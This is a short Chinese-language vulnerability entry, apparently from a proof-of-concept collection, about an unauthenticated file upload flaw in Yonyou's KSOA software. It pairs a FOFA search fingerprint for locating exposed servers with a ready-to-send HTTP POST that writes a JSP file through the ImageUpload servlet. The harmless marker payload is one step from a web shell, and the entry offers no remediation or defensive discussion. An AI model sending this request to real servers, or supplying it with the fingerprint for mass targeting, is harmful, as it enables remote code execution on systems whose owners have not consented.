# 用友时空KSOA软件前台文件上传漏洞

## **漏洞描述**

用友时空KSOA是建立在SOA理念指导下研发的新一代产品，是根据流通企业前沿的IT需求推出的统一的IT基础架构，它可以让流通企业各个时期建立的IT系统之间彼此轻松对话，帮助流通企业保护原有的IT投资，简化IT管理，提升竞争能力，确保企业整体的战略目标以及创新活动的实现。

## 漏洞指纹

```
fofa：app="用友-时空KSOA"
```

## 漏洞POC

```r
POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=test1234554321.jsp HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 32

<% out.println("test1234554321"); %>
```

